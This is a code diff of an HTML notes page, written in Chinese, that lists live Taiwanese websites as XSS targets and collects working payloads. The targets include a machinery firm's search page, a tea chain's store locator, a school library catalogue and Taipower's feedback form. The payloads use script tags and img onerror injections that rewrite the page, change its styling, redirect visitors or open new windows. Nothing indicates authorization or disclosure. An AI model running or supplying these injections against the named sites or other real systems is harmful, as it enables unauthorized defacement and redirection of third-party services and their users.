@@ -101,13 +101,21 @@
     <h2>內容</h2>
     <div class="note">
         <textarea>
-            [中華機械-搜尋頁面]
+[中華機械-搜尋頁面]
 https://www.capitalmachinery.com.tw/
 https://www.capitalmachinery.com.tw/search-result.php?keyword=
 
 [清心福全-門市據點]
 https://www.chingshin.tw/
 https://www.chingshin.tw/store.php/?city=
+
+
+DOM型
+[新竹高工圖書館]
+http://lib.hcvs.hc.edu.tw/webopac/BKSEEK.PHP
+
+[台灣電力股份有限公司-用戶意見電子郵件]
+https://csms.taipower.com.tw/TPuser
 
 --------------------------------------------------------------------------
 [反射型XSS] alert彈出
@@ -133,14 +141,26 @@ document.write('TEXT')
 }
 </script>
 
+<img src="" onerror="document.write('TEXT')">
+
+---------------------------------------
  2.直接修改DOM 修改navbar導覽列
 <script>
-document.getElementById('mainNav').style.background='yellow';
+document.body.style.background='yellow';
 </script>
 
+---------------------------------------
  3.重定向document網址
 <script>
 document.location='https://www.google.com'
+</script>
+
+<img src="" onerror="document.location='https://www.google.com'">
+
+--------------------------------------------------------------------------
+ 4.打開和修改窗口
+<script>
+window.open('https://www.google.com')
 </script>
 
 --------------------------------------------------------------------------
